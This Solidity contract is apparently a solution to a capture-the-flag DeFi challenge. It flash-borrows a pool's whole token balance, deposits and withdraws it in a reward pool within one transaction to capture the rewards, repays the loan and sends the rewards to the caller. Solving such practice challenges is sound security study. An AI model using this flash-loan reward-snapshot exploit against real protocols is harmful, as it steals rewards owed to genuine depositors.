// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {TheRewarderPool} from "./TheRewarderPool.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";
contract TheRewarderPoolAttacker {
    TheRewarderPool theRewarderPool;
    FlashLoanerPool flashLoanerPool;
    constructor(TheRewarderPool _theRewarderPool,FlashLoanerPool _flashLoanerPool) {
        theRewarderPool = _theRewarderPool;
        flashLoanerPool = _flashLoanerPool;
    }

    function attack() external {
        IERC20 liquidityToken = IERC20(address(flashLoanerPool.liquidityToken()));
        liquidityToken.approve(address(theRewarderPool), type(uint256).max);
        uint amount = liquidityToken.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(amount);
        theRewarderPool.rewardToken().transfer(msg.sender, theRewarderPool.rewardToken().balanceOf(address(this)));
    }
    function receiveFlashLoan(uint256 amount) external {
        IERC20 liquidityToken = IERC20(address(flashLoanerPool.liquidityToken()));
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}